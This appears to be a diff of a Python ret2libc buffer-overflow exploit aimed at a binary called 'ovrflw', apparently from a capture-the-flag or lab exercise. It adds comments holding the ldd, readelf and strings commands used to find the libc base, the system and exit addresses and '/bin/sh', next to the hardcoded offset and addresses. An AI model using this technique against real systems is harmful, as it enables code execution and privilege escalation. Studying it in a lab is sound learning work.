@@ -16,9 +16,12 @@ signal.signal(signal.SIGINT, def_handler)
 # Variable_Global
 
 offset = 112
+# ldd /usr/local/bin/ovrflw | grep libc | grep -oP "\(.*?\)" | tr -d "()"
 libc = 0xb7558000
+# readelf -s /lib/i386-linux-gnu/libc.so.6 | egrep -i " system@| exit@"
 system = 0x00040310
 exit = 0x00033260
+# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 bin_sh = 0x00162bac
 
 def exploit():
